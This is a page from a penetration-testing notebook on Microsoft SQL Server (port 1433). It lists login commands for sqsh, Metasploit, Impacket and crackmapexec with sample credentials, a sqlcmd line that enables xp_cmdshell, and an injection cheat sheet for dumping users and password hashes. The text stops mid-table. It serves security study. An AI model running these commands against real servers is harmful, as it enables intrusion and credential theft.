
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>1433 - Microsoft SQL Â· GitBook</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="Microsoft SQL Server is a relational database management system developed by Microsoft.">
        <meta name="generator" content="GitBook 3.2.3">
        
        
        
    
    <link rel="stylesheet" href="../../../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../../../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="1521-oracle-db.html" />
    
    
    <link rel="prev" href="1099-java-rmi.html" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../../../">
            
                <a href="../../../">
            
                    
                    Initial page
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="../../../table-of-content.html">
            
                <a href="../../../table-of-content.html">
            
                    
                    Table Of Content
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Infrastructure testing</li>
        
        
    
        <li class="chapter " data-level="2.1" data-path="../">
            
                <a href="../">
            
                    
                    Enumeration
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.1.1" data-path="../packet-capture.html">
            
                <a href="../packet-capture.html">
            
                    
                    Packet Capture
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.2" data-path="../host-disocvery.html">
            
                <a href="../host-disocvery.html">
            
                    
                    Host Discovery
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3" data-path="./">
            
                <a href="./">
            
                    
                    Services / Ports
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.1.3.1" data-path="ftp.html">
            
                <a href="ftp.html">
            
                    
                    21 - FTP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.2" data-path="ssh.html">
            
                <a href="ssh.html">
            
                    
                    22 - SSH
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.3" data-path="smtp.html">
            
                <a href="smtp.html">
            
                    
                    25 - SMTP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.4" data-path="dns.html">
            
                <a href="dns.html">
            
                    
                    53 - DNS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.5" data-path="dhcp.html">
            
                <a href="dhcp.html">
            
                    
                    67 - DHCP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.6" data-path="69-tftp.html">
            
                <a href="69-tftp.html">
            
                    
                    69 - TFTP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.7" data-path="finger.html">
            
                <a href="finger.html">
            
                    
                    79 - Finger
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.8" data-path="88-kerberos.html">
            
                <a href="88-kerberos.html">
            
                    
                    88 - Kerberos
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.9" data-path="rpc.html">
            
                <a href="rpc.html">
            
                    
                    111 - RPC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.10" data-path="ident.html">
            
                <a href="ident.html">
            
                    
                    113 - ident
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.11" data-path="135-msrpc.html">
            
                <a href="135-msrpc.html">
            
                    
                    135 - MSRPC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.12" data-path="netbios.html">
            
                <a href="netbios.html">
            
                    
                    137 - Netbios
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.13" data-path="smb.html">
            
                <a href="smb.html">
            
                    
                    139/445 - SMB
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.14" data-path="snmp.html">
            
                <a href="snmp.html">
            
                    
                    161 - SNMP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.15" data-path="xdmcp.html">
            
                <a href="xdmcp.html">
            
                    
                    177 - XDMCP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.16" data-path="ldap.html">
            
                <a href="ldap.html">
            
                    
                    363 - LDAP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.17" data-path="443-https.html">
            
                <a href="443-https.html">
            
                    
                    443 - HTTPS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.18" data-path="ike.html">
            
                <a href="ike.html">
            
                    
                    500 - IKE (IPSEC)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.19" data-path="rservices.html">
            
                <a href="rservices.html">
            
                    
                    512/513/514 - R Services
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.20" data-path="ipmi.html">
            
                <a href="ipmi.html">
            
                    
                    623 - IPMI
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.21" data-path="873-rsync.html">
            
                <a href="873-rsync.html">
            
                    
                    873 - RSYNC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.22" data-path="1099-java-rmi.html">
            
                <a href="1099-java-rmi.html">
            
                    
                    1099 - Java RMI
            
                </a>
            

            
        </li>
    
        <li class="chapter active" data-level="2.1.3.23" data-path="1433-microsoft-sql.html">
            
                <a href="1433-microsoft-sql.html">
            
                    
                    1433 - Microsoft SQL
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.24" data-path="1521-oracle-db.html">
            
                <a href="1521-oracle-db.html">
            
                    
                    1521 - Oracle DB
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.25" data-path="nfs.html">
            
                <a href="nfs.html">
            
                    
                    2049 - NFS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.26" data-path="3306-mysql.html">
            
                <a href="3306-mysql.html">
            
                    
                    3306 - MySQL
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.27" data-path="3389-rdp.html">
            
                <a href="3389-rdp.html">
            
                    
                    3389 - RDP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.28" data-path="5432-postgressql.html">
            
                <a href="5432-postgressql.html">
            
                    
                    5432 - PostgresSQL
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.29" data-path="vnc.html">
            
                <a href="vnc.html">
            
                    
                    5900 - VNC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.30" data-path="winrm.html">
            
                <a href="winrm.html">
            
                    
                    5985 - WinRM
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.31" data-path="x11.html">
            
                <a href="x11.html">
            
                    
                    6000 - X11
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.32" data-path="redis.html">
            
                <a href="redis.html">
            
                    
                    6379 - Redis
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.33" data-path="memcached.html">
            
                <a href="memcached.html">
            
                    
                    11211 - Memcached
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.34" data-path="rds.html">
            
                <a href="rds.html">
            
                    
                    RDS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.35" data-path="sqlite.html">
            
                <a href="sqlite.html">
            
                    
                    SQLite
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3.36" data-path="docker.html">
            
                <a href="docker.html">
            
                    
                    Docker
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.1.4" data-path="../ipv6/">
            
                <a href="../ipv6/">
            
                    
                    IPV6
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.1.4.1" data-path="../ipv6/scanning.html">
            
                <a href="../ipv6/scanning.html">
            
                    
                    Scanning
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.4.2" data-path="../ipv6/enumeration.html">
            
                <a href="../ipv6/enumeration.html">
            
                    
                    Enumeration
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.4.3" data-path="../ipv6/transfering-files.html">
            
                <a href="../ipv6/transfering-files.html">
            
                    
                    Transfering files
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.4.4" data-path="../ipv6/pivoting-and-routes.html">
            
                <a href="../ipv6/pivoting-and-routes.html">
            
                    
                    Pivoting and routes
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.4.5" data-path="../ipv6/thc-ipv6.html">
            
                <a href="../ipv6/thc-ipv6.html">
            
                    
                    THC IPv6
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.2" data-path="../../gaining-access/">
            
                <a href="../../gaining-access/">
            
                    
                    Gaining Access
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.2.1" data-path="../../gaining-access/ip-forwarding.html">
            
                <a href="../../gaining-access/ip-forwarding.html">
            
                    
                    IP Forwarding
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.2.2" data-path="../../gaining-access/vlan-hopping.html">
            
                <a href="../../gaining-access/vlan-hopping.html">
            
                    
                    VLAN hopping
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.2.3" data-path="../../gaining-access/psexec.html">
            
                <a href="../../gaining-access/psexec.html">
            
                    
                    Psexec
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.2.4" data-path="../../gaining-access/upgrading-shell.html">
            
                <a href="../../gaining-access/upgrading-shell.html">
            
                    
                    Upgrading shell
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.2.5" data-path="../../gaining-access/reverse-shells-one-liners.html">
            
                <a href="../../gaining-access/reverse-shells-one-liners.html">
            
                    
                    Reverse Shells One-Liners
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.2.6" data-path="../../gaining-access/bruteforce.html">
            
                <a href="../../gaining-access/bruteforce.html">
            
                    
                    Bruteforce
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.2.7" data-path="../../gaining-access/mitm-cleartext-protocols.html">
            
                <a href="../../gaining-access/mitm-cleartext-protocols.html">
            
                    
                    MITM cleartext protocols
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.2.8" data-path="../../gaining-access/null-session.html">
            
                <a href="../../gaining-access/null-session.html">
            
                    
                    Null session
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.2.9" data-path="../../gaining-access/llmnr-nbt-ns-spoofing.html">
            
                <a href="../../gaining-access/llmnr-nbt-ns-spoofing.html">
            
                    
                    LLMNR / NBT NS Spoofing
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.2.10" data-path="../../gaining-access/port-knocking.html">
            
                <a href="../../gaining-access/port-knocking.html">
            
                    
                    Port knocking
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.2.11" data-path="../../gaining-access/downloading-transfer-files.html">
            
                <a href="../../gaining-access/downloading-transfer-files.html">
            
                    
                    Downloading/Transfer files
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.2.12" data-path="../../gaining-access/remote-desktop.html">
            
                <a href="../../gaining-access/remote-desktop.html">
            
                    
                    Remote Desktop
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.2.13" data-path="../../gaining-access/nac-bypass.html">
            
                <a href="../../gaining-access/nac-bypass.html">
            
                    
                    NAC Bypass
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.2.14" data-path="../../gaining-access/pass-the-hash.html">
            
                <a href="../../gaining-access/pass-the-hash.html">
            
                    
                    Pass-The-Hash
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.3" data-path="../../exploitation/">
            
                <a href="../../exploitation/">
            
                    
                    Exploitation
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.3.1" data-path="../../exploitation/solaris.html">
            
                <a href="../../exploitation/solaris.html">
            
                    
                    Solaris
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.3.2" data-path="../../exploitation/ipv6.html">
            
                <a href="../../exploitation/ipv6.html">
            
                    
                    IPv6
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.3.3" data-path="../../exploitation/windows/">
            
                <a href="../../exploitation/windows/">
            
                    
                    Windows
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.3.3.1" data-path="../../exploitation/windows/compiling-code.html">
            
                <a href="../../exploitation/windows/compiling-code.html">
            
                    
                    Compiling Code
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.3.3.2" data-path="../../exploitation/windows/smb-vulnaribilites.html">
            
                <a href="../../exploitation/windows/smb-vulnaribilites.html">
            
                    
                    SMB Vulnerabilities
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.3.3.3" data-path="../../exploitation/windows/kerberos-attacks.html">
            
                <a href="../../exploitation/windows/kerberos-attacks.html">
            
                    
                    Kerberos Attacks
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.4" data-path="../../privilege-esclation/">
            
                <a href="../../privilege-esclation/">
            
                    
                    Privilege Escalation
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.4.1" data-path="../../privilege-esclation/situational-awareness/">
            
                <a href="../../privilege-esclation/situational-awareness/">
            
                    
                    Situational Awareness
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.4.1.1" data-path="../../privilege-esclation/situational-awareness/linux.html">
            
                <a href="../../privilege-esclation/situational-awareness/linux.html">
            
                    
                    Linux
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.4.1.2" data-path="../../privilege-esclation/situational-awareness/windows/">
            
                <a href="../../privilege-esclation/situational-awareness/windows/">
            
                    
                    Windows
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.4.1.2.1" data-path="../../privilege-esclation/situational-awareness/windows/registry.html">
            
                <a href="../../privilege-esclation/situational-awareness/windows/registry.html">
            
                    
                    Registry
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.4.1.2.2" data-path="../../privilege-esclation/situational-awareness/windows/powerview.html">
            
                <a href="../../privilege-esclation/situational-awareness/windows/powerview.html">
            
                    
                    PowerView
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.4.1.2.3" data-path="../../privilege-esclation/situational-awareness/windows/fsmo-roles.html">
            
                <a href="../../privilege-esclation/situational-awareness/windows/fsmo-roles.html">
            
                    
                    FSMO Roles
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.4.2" data-path="../../privilege-esclation/windows/">
            
                <a href="../../privilege-esclation/windows/">
            
                    
                    Windows
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.4.2.1" data-path="../../privilege-esclation/windows/disable-apps-and-firewall.html">
            
                <a href="../../privilege-esclation/windows/disable-apps-and-firewall.html">
            
                    
                    Disable Apps and Firewall
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.4.2.2" data-path="../../privilege-esclation/windows/add-user-script.html">
            
                <a href="../../privilege-esclation/windows/add-user-script.html">
            
                    
                    Add user script
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.4.2.3" data-path="../../privilege-esclation/windows/uac-bypass.html">
            
                <a href="../../privilege-esclation/windows/uac-bypass.html">
            
                    
                    UAC Bypass
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.4.2.4" data-path="../../privilege-esclation/windows/icacls.html">
            
                <a href="../../privilege-esclation/windows/icacls.html">
            
                    
                    icacls
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.4.2.5" data-path="../../privilege-esclation/windows/running-services.html">
            
                <a href="../../privilege-esclation/windows/running-services.html">
            
                    
                    Running services
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.4.2.6" data-path="../../privilege-esclation/windows/common-exploits.html">
            
                <a href="../../privilege-esclation/windows/common-exploits.html">
            
                    
                    Common Exploits
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.4.3" data-path="../../privilege-esclation/linux/">
            
                <a href="../../privilege-esclation/linux/">
            
                    
                    Linux
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.4.3.1" data-path="../../privilege-esclation/linux/suid-shell-script.html">
            
                <a href="../../privilege-esclation/linux/suid-shell-script.html">
            
                    
                    SUID Shell script
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.4.3.2" data-path="../../privilege-esclation/linux/cve-2019-14287.html">
            
                <a href="../../privilege-esclation/linux/cve-2019-14287.html">
            
                    
                    CVE-2019-14287
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.4.3.3" data-path="../../privilege-esclation/linux/kernel-exploit.html">
            
                <a href="../../privilege-esclation/linux/kernel-exploit.html">
            
                    
                    Kernel exploit
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.4.4" data-path="../../privilege-esclation/solaris.html">
            
                <a href="../../privilege-esclation/solaris.html">
            
                    
                    Solaris
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.4.5" data-path="../../privilege-esclation/freebsd.html">
            
                <a href="../../privilege-esclation/freebsd.html">
            
                    
                    FreeBSD
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.4.6" data-path="../../privilege-esclation/automated-tools.html">
            
                <a href="../../privilege-esclation/automated-tools.html">
            
                    
                    Automated tools
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.4.7" data-path="../../privilege-esclation/metasploit-modules.html">
            
                <a href="../../privilege-esclation/metasploit-modules.html">
            
                    
                    Metasploit Modules
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.4.8" data-path="../../privilege-esclation/password-dumping.html">
            
                <a href="../../privilege-esclation/password-dumping.html">
            
                    
                    Password Dumping
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.5" data-path="../../breakout/">
            
                <a href="../../breakout/">
            
                    
                    Breakout
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.5.1" data-path="../../breakout/lolbas.html">
            
                <a href="../../breakout/lolbas.html">
            
                    
                    LOLBas
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.5.2" data-path="../../breakout/powershell-constrained-language-byass.html">
            
                <a href="../../breakout/powershell-constrained-language-byass.html">
            
                    
                    powershell constrained language byass
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.5.3" data-path="../../breakout/alternatives-to-command-prompt.md">
            
                <span>
            
                    
                    Alternatives to command prompt
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.5.4" data-path="../../breakout/windows-utilities.html">
            
                <a href="../../breakout/windows-utilities.html">
            
                    
                    Windows utilities
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.5.5" data-path="../../breakout/applocker.html">
            
                <a href="../../breakout/applocker.html">
            
                    
                    Applocker
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.5.6" data-path="../../breakout/restricted-shells.html">
            
                <a href="../../breakout/restricted-shells.html">
            
                    
                    Restricted shells
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.5.7" data-path="../../breakout/environmental-variables-bypassing-path-restrictions.html">
            
                <a href="../../breakout/environmental-variables-bypassing-path-restrictions.html">
            
                    
                    Environmental Variables / Bypassing Path Restrictions
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.5.8" data-path="../../breakout/docker-escape.html">
            
                <a href="../../breakout/docker-escape.html">
            
                    
                    Docker escape
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.6" data-path="../../presistance/">
            
                <a href="../../presistance/">
            
                    
                    Presistance
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.6.1" data-path="../../presistance/windows.html">
            
                <a href="../../presistance/windows.html">
            
                    
                    Windows
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.7" data-path="../../pivoting/">
            
                <a href="../../pivoting/">
            
                    
                    Pivoting
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.7.1" data-path="../../pivoting/adding-routes.html">
            
                <a href="../../pivoting/adding-routes.html">
            
                    
                    Adding routes
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.8" data-path="../../password-cracking/">
            
                <a href="../../password-cracking/">
            
                    
                    Password Cracking
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.8.1" data-path="../../password-cracking/hashcat.html">
            
                <a href="../../password-cracking/hashcat.html">
            
                    
                    Hashcat
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.8.2" data-path="../../password-cracking/john.html">
            
                <a href="../../password-cracking/john.html">
            
                    
                    John
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.8.3" data-path="../../password-cracking/cisco-passwords.html">
            
                <a href="../../password-cracking/cisco-passwords.html">
            
                    
                    Cisco Passwords
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.8.4" data-path="../../password-cracking/passwords-lists.html">
            
                <a href="../../password-cracking/passwords-lists.html">
            
                    
                    Passwords Lists
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.8.5" data-path="../../password-cracking/generating-wordlist.html">
            
                <a href="../../password-cracking/generating-wordlist.html">
            
                    
                    Generating wordlist
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.9" data-path="../../tools/">
            
                <a href="../../tools/">
            
                    
                    Tools
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.9.1" data-path="../../tools/nishang.html">
            
                <a href="../../tools/nishang.html">
            
                    
                    Nishang
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.9.2" data-path="../../tools/uacme.html">
            
                <a href="../../tools/uacme.html">
            
                    
                    UACME
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.9.3" data-path="../../tools/bypass-uac.html">
            
                <a href="../../tools/bypass-uac.html">
            
                    
                    Bypass-UAC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.9.4" data-path="../../tools/msbuildapicaller.html">
            
                <a href="../../tools/msbuildapicaller.html">
            
                    
                    MSBuildAPICaller
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.9.5" data-path="../../tools/impacket.html">
            
                <a href="../../tools/impacket.html">
            
                    
                    Impacket
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.9.6" data-path="../../tools/sharppersist.html">
            
                <a href="../../tools/sharppersist.html">
            
                    
                    SharpPersist
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.9.7" data-path="../../tools/terminals.html">
            
                <a href="../../tools/terminals.html">
            
                    
                    Terminals
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.9.8" data-path="../../tools/ip-calculation.html">
            
                <a href="../../tools/ip-calculation.html">
            
                    
                    IP Calculation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.9.9" data-path="../../tools/pwsh.html">
            
                <a href="../../tools/pwsh.html">
            
                    
                    pwsh
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.9.10" data-path="../../tools/pstools-sysinternals.html">
            
                <a href="../../tools/pstools-sysinternals.html">
            
                    
                    psTools / Sysinternals
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.9.11" data-path="../../tools/unlock-applocker.html">
            
                <a href="../../tools/unlock-applocker.html">
            
                    
                    Unlock applocker
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.9.12" data-path="../../tools/enum4linux.html">
            
                <a href="../../tools/enum4linux.html">
            
                    
                    enum4linux
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.9.13" data-path="../../tools/bloodhound/">
            
                <a href="../../tools/bloodhound/">
            
                    
                    Bloodhound
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.9.13.1" data-path="../../tools/bloodhound/aclpwn.html">
            
                <a href="../../tools/bloodhound/aclpwn.html">
            
                    
                    aclpwn
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.9.14" data-path="../../tools/mitm6.html">
            
                <a href="../../tools/mitm6.html">
            
                    
                    mitm6
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.9.15" data-path="../../tools/enyx.html">
            
                <a href="../../tools/enyx.html">
            
                    
                    Enyx
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.9.16" data-path="../../tools/nfsshell.html">
            
                <a href="../../tools/nfsshell.html">
            
                    
                    nfsshell
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.9.17" data-path="../../tools/powerupsql.html">
            
                <a href="../../tools/powerupsql.html">
            
                    
                    PowerUpSQL
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.9.18" data-path="../../tools/metasploit/">
            
                <a href="../../tools/metasploit/">
            
                    
                    Metasploit
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.9.18.1" data-path="../../tools/metasploit/msfvenom.html">
            
                <a href="../../tools/metasploit/msfvenom.html">
            
                    
                    msfvenom
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.10" data-path="../../others.html">
            
                <a href="../../others.html">
            
                    
                    Others
            
                </a>
            

            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href="../../.." >1433 - Microsoft SQL</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h1 id="1433---microsoft-sql">1433 - Microsoft SQL</h1>
<p>Normal Port - 1433</p>
<p>Hidden mode port - 2433</p>
<h2 id="connect">Connect</h2>
<p>Connect using one of the following options: </p>
<h3 id="sqsh">sqsh</h3>
<p><code>sqsh -S someserver -U sa -P password</code> </p>
<h3 id="metasploit">metasploit</h3>
<p>metasploit (mssql_login) </p>
<p><code>msf auxiliary(mssql_login) &gt; use auxiliary/scanner/mssql/mssql_login</code></p>
<h3 id="mssqclient">mssqclient</h3>
<p>Impacket script <a href="../../tools/impacket.html#mssqlclient">mssqclient</a> </p>
<p><code>mssqlclient.py reporting:&apos;PcwTWTHRwryjc$c6&apos;@10.10.10.125 -windows-auth</code></p>
<h3 id="sqlcmd">sqlcmd</h3>
<p>sqlcmd. To use SQL Server Authentication, you must specify a user name and password by using the -U and -P options.</p>
<p><code>sqlcmd -y0 -d ADSync -Q &quot;EXEC sp_configure &apos;show advanced options&apos;, 1; RECONFIGURE; EXEC sp_configure &apos;xp_cmdshell&apos;, 1; RECONFIGURE;&quot;</code></p>
<h3 id="crackmapexec">crackmapexec</h3>
<p><code>cme mssql 10.10.10.52 -u james -p &apos;J@m3s_P@ssW0rd!&apos;</code></p>
<h2 id="mssql-2003-commands">MSSQL 2003 commands</h2>
<p>taken from: <a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet" target="_blank">http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet</a></p>
<table>
  <thead>
    <tr>
      <th style="text-align:left">Task</th>
      <th style="text-align:left">Command</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">Version</td>
      <td style="text-align:left">SELECT @@version</td>
    </tr>
    <tr>
      <td style="text-align:left">Comments</td>
      <td style="text-align:left">
        <p>SELECT 1 -- comment</p>
        <p>SELECT /*comment*/1</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Current User</td>
      <td style="text-align:left">
        <p>SELECT user_name();</p>
        <p>SELECT system_user;</p>
        <p>SELECT user;</p>
        <p>SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">List Users</td>
      <td style="text-align:left">SELECT name FROM master..syslogins</td>
    </tr>
    <tr>
      <td style="text-align:left">List Password Hashes</td>
      <td style="text-align:left">
        <p>SELECT name, password FROM master..sysxlogins -- priv, mssql 2000;</p>
